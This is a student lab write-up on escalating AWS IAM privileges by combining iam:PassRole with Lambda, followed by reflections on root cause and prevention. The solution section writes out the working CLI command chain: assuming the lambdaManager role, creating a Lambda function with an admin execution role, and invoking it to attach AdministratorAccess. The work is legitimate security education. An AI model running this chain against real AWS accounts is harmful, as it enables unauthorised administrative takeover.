\# Lab 3 - IAM Privilege Escalation via Lambda Function Invocation



\## Solution Steps



\### 1. Environment Setup

\- Forked the repository: https://github.com/shanmukh2809/ccgc5501-cloud-security-challenge-lambda\_privesc

\- Deployed the scenario using Terraform on a personal AWS account (AWS Academy Learner Lab blocked IAM resource creation with an explicit deny policy, so a personal account with AdministratorAccess was used to run `terraform apply`).

\- `terraform apply` created 9 resources: IAM user `chris`, IAM roles `lambdaManager` and `debug`, associated policies, and access keys.



\### 2. Initial Access as Chris

\- Retrieved chris's credentials using `terraform output chris\_access\_key\_id` and `terraform output -raw chris\_secret\_access\_key`.

\- Configured a named AWS CLI profile: `aws configure --profile chris`

\- Verified identity: `aws sts get-caller-identity --profile chris`

&#x20; Confirmed ARN: `arn:aws:iam::<account\_id>:user/chris-lambda\_privesc`



\### 3. Enumeration

\- Reviewed the README/architecture diagram, which revealed:

&#x20; - chris has `iam:Get\*`, `iam:List\*`, and `sts:AssumeRole` permissions

&#x20; - chris can assume the `lambdaManager` role

&#x20; - `lambdaManager` role has `lambda:\*` and `iam:PassRole` permissions

&#x20; - `iam:PassRole` allows passing the `debug` role, which has `AdministratorAccess` attached and trusts the Lambda service



\### 4. Privilege Escalation

\- Assumed the `lambdaManager` role from chris:

&#x20; `aws sts assume-role --role-arn arn:aws:iam::<account\_id>:role/lambdaManager-role-lambda\_privesc --role-session-name privesc-session --profile chris`

\- Exported the temporary credentials (AccessKeyId, SecretAccessKey, SessionToken) as environment variables.

\- Wrote a malicious Lambda function (`lambda\_function.py`) that uses boto3 to attach `AdministratorAccess` to chris.

\- Zipped the code and created the Lambda function, passing the `debug` role as its execution role (this is the `iam:PassRole` abuse step):

&#x20; `aws lambda create-function --function-name privesc-function --runtime python3.12 --role arn:aws:iam::<account\_id>:role/debug-role-lambda\_privesc --handler lambda\_function.lambda\_handler --zip-file fileb://function.zip`

\- Invoked the function: `aws lambda invoke --function-name privesc-function output.txt`

&#x20; Result: `{"statusCode": 200, "body": "AdministratorAccess attached to chris"}`



\### 5. Verification

\- Confirmed privilege escalation:

&#x20; `aws iam list-attached-user-policies --user-name chris-lambda\_privesc --profile chris`

&#x20; Output showed `AdministratorAccess` attached to chris.



\## Reflections



\*\*1. What was the root cause of this privilege escalation path?\*\*

The root cause was combining `iam:PassRole` and `lambda:\*` on the `lambdaManager` role with a `debug` role that had `AdministratorAccess` and a Lambda-trusted assume-role policy. PassRole alone isn't dangerous, but paired with the ability to create/invoke Lambda functions, it lets an attacker indirectly execute code with the permissions of any role they can pass.



\*\*2. Why is iam:PassRole considered a dangerous permission?\*\*

PassRole doesn't grant direct access to a role's permissions, but lets a principal delegate a role to a service. If that role is overly privileged and the service can run arbitrary code (like Lambda), the principal effectively gains those permissions indirectly.



\*\*3. How could this have been prevented?\*\*

\- Scope `iam:PassRole` with conditions (e.g. `iam:PassedToService`, specific role ARNs) instead of granting it broadly.

\- Never attach `AdministratorAccess` to a Lambda execution role.

\- Use IAM Access Analyzer to detect privilege escalation paths.

\- Monitor CloudTrail for `sts:AssumeRole`, `lambda:CreateFunction`, and `iam:AttachUserPolicy` events.

\- Use Service Control Policies (SCPs) to block attaching `AdministratorAccess` account-wide.



\*\*4. What did this exercise teach you about IAM permission design?\*\*

Individual permissions look harmless in isolation but become dangerous in combination. You have to map the full graph of assumable roles, what those roles can pass, and what the target service can execute — not just review direct user permissions.



\*\*5. What challenges did you face during this lab?\*\*

AWS Academy Learner Lab had an explicit deny policy blocking `iam:CreateUser`/`iam:CreateRole`, so the scenario couldn't deploy in the sandbox account. Switching to a personal AWS account with full IAM permissions was required to complete deployment.

